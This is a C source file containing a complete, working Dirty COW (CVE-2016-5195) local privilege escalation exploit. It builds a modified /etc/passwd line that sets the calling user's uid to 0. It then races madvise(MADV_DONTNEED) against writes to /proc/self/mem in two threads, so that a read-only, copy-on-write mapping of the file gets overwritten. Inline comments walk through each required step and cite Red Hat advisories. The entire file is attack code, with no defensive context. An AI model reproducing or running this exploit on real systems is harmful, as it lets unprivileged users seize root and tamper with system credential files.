#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/types.h>
#include <pwd.h>

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i<100000000;i++)
  {
/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
> This is achieved by racing the madvise(MADV_DONTNEED) system call
> while having the page of the executable mmapped in memory.
*/
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf("madvise %d\n\n",c);
}
void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;
/*
You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
>  The in the wild exploit we are aware of doesn't work on Red Hat
>  Enterprise Linux 5 and 6 out of the box because on one side of
>  the race it writes to /proc/self/mem, but /proc/self/mem is not
>  writable on Red Hat Enterprise Linux 5 and 6.   
*/
  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;
  for(i=0;i<100000000;i++) {
/*
You have to reset the file pointer to the memory position.
*/
    lseek(f,(uintptr_t) map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }
  printf("procselfmem %d\n\n", c);
}
int main(int argc,char *argv[])
{
  pthread_t pth1,pth2;
  name=strdup("/etc/passwd");
  f=open(name,O_RDONLY);
  fstat(f,&st);
  char* towrite=malloc(st.st_size+1);
  read(f, towrite, st.st_size);
  towrite[st.st_size]=0;
  close(f);
  char *attackline; char *exploitedline;
  struct passwd *attacker=getpwuid(getuid());
  asprintf(&attackline,"%s:%s:%d:%d:%s:%s:%s",attacker->pw_name,attacker->pw_passwd,attacker->pw_uid, attacker->pw_gid,attacker->pw_gecos,attacker->pw_dir,attacker->pw_shell);
  asprintf(&exploitedline,"%s:%s:0:%d:%s:%s:%s",attacker->pw_name,attacker->pw_passwd, attacker->pw_gid,attacker->pw_gecos,attacker->pw_dir,attacker->pw_shell);
  char *endoffile=strstr(towrite,attackline)+strlen(attackline);
  char *changelocation=strstr(towrite,attackline); 
  int oldfilelen=strlen(towrite);
  sprintf(changelocation,"%s%s",exploitedline,endoffile);
  int linediff=strlen(attackline)-strlen(exploitedline);
  int i; for(i=oldfilelen; i>oldfilelen-linediff; i--) towrite[i-1]='\n';
/*
You have to open the file in read only mode.
*/
  f=open(name,O_RDONLY);
  fstat(f,&st);
/*
You have to use MAP_PRIVATE for copy-on-write mapping.
> Create a private copy-on-write mapping.  Updates to the
> mapping are not visible to other processes mapping the same
> file, and are not carried through to the underlying file.  It
> is unspecified whether changes made to the file after the
> mmap() call are visible in the mapped region.
*/
/*
You have to open with PROT_READ.
*/
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %zx\n\n",(uintptr_t) map);
/*
You have to do it on two threads.
*/
  pthread_create(&pth1,NULL,madviseThread,name);   
  pthread_create(&pth2,NULL,procselfmemThread,towrite);
/*
You have to wait for the threads to finish.
*/
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}
